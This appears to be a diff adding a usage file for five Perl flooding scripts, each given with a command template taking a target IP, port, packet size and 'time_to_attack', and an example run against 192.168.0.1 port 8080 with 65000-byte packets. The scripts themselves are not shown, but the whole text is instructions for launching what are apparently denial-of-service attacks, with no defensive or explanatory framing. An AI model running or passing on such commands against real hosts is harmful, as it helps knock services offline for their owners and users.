@@ -1,0 +1,27 @@
+$ perl weed.pl <ip> <port> <packet_size> <time_to_attack>
+
+$ perl weed.pl 192.168.0.1 8080 65000 5
+
+
+
+$ perl Packet.pl <ip> <port> <packet_size> <time_to_attack>
+
+$ perl Packet.pl 192.168.0.1 8080 65000 5
+
+
+
+$ perl slap.pl <ip> <port> <packet_size> <time_to_attack>
+
+$ perl slap.pl 192.168.0.1 8080 65000 5
+
+
+
+$ perl PortLords.pl <ip> <port> <packet_size> <time_to_attack>
+
+$ perl PortLords.pl 192.168.0.1 8080 65000 5
+
+
+
+$ perl vape.pl <ip> <port> <packet_size> <time_to_attack>
+
+$ perl vape.pl 192.168.0.1 8080 65000 5
